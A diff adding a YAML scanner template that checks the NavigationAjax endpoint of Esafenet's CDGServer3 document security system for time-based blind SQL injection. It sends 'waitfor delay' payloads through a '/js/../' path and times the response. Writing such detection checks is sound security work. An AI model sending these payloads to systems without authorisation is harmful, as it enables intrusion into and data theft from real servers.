@@ -1,0 +1,25 @@
+name: 亿赛通-电子文档安全管理系统-NavigationAjax-SQL注入
+description: >-
+  SQL注入
+alwaysExecute: false
+timeout: 6
+matchCount: 2
+rules:
+  - method: POST
+    path: /CDGServer3/js/../NavigationAjax
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: >-
+      command=nav&id=-999'waitfor delay '0:0:3'--+&name=&openId=
+    expression:
+      status: 200
+      sleep: 3
+  - method: POST
+    path: /CDGServer3/js/../NavigationAjax
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: >-
+      command=nav&id=-999'waitfor delay '0:0:4'--+&name=&openId=
+    expression:
+      status: 200
+      sleep: 4
